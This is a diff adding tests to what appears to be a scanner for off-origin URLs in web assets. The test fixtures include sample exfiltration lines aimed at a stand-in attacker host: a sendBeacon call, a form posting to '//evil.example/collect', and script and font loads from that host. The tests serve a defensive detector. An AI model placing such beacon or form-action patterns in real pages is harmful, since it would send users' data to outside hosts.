@@ -63,6 +63,46 @@ test("same-origin, relative, data:, blob: and the 3MF/SVG namespace strings pass
   assert.deepEqual(found, []);
 });
 
+test("protocol-relative URLs are caught in CSS, HTML attributes, srcset and JS strings", async () => {
+  const cases = {
+    "css-url.css": ".x{background:url(//evil.example/f.woff2)}",
+    "css-url-quoted.css": "@font-face{src:url('//evil.example/f.woff2')}",
+    "css-import.css": "@import \"//evil.example/x.css\";",
+    "css-import-url.css": "@import url(//evil.example/y.css);",
+    "script.html": "<!doctype html><script src=\"//evil.example/x.js\"></script>",
+    "script-unquoted.html": "<!doctype html><script src=//evil.example/u.js></script>",
+    "img.html": "<!doctype html><img alt=\"\" src='//cdn.evil.example/p.png'>",
+    "srcset.html": "<!doctype html><img alt=\"\" srcset=\"/a.png 1x, //evil.example/b.png 2x\">",
+    "form.html": "<!doctype html><form action=\"//evil.example/collect\"></form>",
+    "beacon.js": "const u=\"//evil.example/x\";navigator.sendBeacon(u,d)",
+    "single.js": "const u='//evil.example:8443/x';",
+    "template.js": "const u=`//evil.example/t`;",
+    "ip.js": "const u='//10.0.0.5/x';",
+    "localhost.js": "const u=\"//localhost:9000/x\";"
+  };
+  const found = await findingsFor(cases);
+  for (const name of Object.keys(cases)) assert.ok(found.some(f => f.file.endsWith(name)), `${name} not flagged: ${JSON.stringify(found)}`);
+  assert.ok(found.some(f => f.file.endsWith("beacon.js") && f.url === "//evil.example/x"), JSON.stringify(found));
+});
+
+test("comments, regexes, paths, base64, data:, same-origin assets and namespaces are not protocol-relative URLs", async () => {
+  const found = await findingsFor({
+    "a.js": [
+      "// a comment about //things and docs.example.com",
+      "x='';// trailing comment",
+      "const re=/^https?:\\/\\//i, re2=/\\/\\/evil\\.example/;",
+      "const path='/customize/assets/x.js', joined='/a//b.c/d';",
+      "const b64='AAAA//8AAP//AAA=', b64b=\"//8AAAA+//wA\";",
+      "const d='data:image/png;base64,iVBOR//w0KGgo=';",
+      "const ns='http://www.w3.org/2000/svg';",
+      "/*! license, see //opensource.example.org in docs */"
+    ].join("\n"),
+    "b.css": ".a{background:url(/assets/x.png)} .b{background:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E\")} @import \"./fonts.css\";",
+    "c.html": "<!doctype html><link rel=\"stylesheet\" href=\"/assets/css/site.css\"><script type=\"module\" src=\"/customize/assets/app.js\"></script><img alt=\"\" srcset=\"/a.png 1x, /b.png 2x\">"
+  });
+  assert.deepEqual(found, []);
+});
+
 test("a look-alike of an allowed string is not allowed", async () => {
   const found = await findingsFor({
     "x.js": "fetch('https://3dprint4.me.evil.example/x');fetch('http://schemas.microsoft.com.evil.example/a')"
